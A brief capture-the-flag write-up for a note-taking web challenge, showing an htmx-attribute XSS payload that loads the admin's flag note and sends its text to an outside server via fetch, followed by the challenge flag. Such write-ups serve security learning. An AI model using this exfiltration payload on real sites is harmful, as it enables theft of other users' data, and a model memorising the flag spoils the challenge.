#### Challenge:

We're excited to announce our new, revolutionary product: A note-taking app. This phenomenal product uses the most up-to-date, bleeding-edge tech in order to stay ahead of all potential security issues. No-one can pwn us.

[Download challenge files](./notes.zip ":ignore")

[The Website](https://awesomenotes.online/)

---

#### Solution:

- poking around reveals that the `htmx` is used for fetching of data and also is whitelisted thus we can exploit it for XSS
```html
<div 
  hx-get="/note/flag" 
  hx-on::after-swap="fetch('/api/note/flag')
    .then((r)=>r.text())
    .then((t)=>fetch('https://my-server/'+encodeURI(t)))"
  hx-trigger="load delay:0.001s"
  hx-swap="innerHTML"
  hx-target="this"
>
```

- report above note for `admin` inspection and profit

---

<details><summary>FLAG:</summary>

```
flag{C3r34l_1s_s0up_l1k3_1f_4gr33}
```

</details>
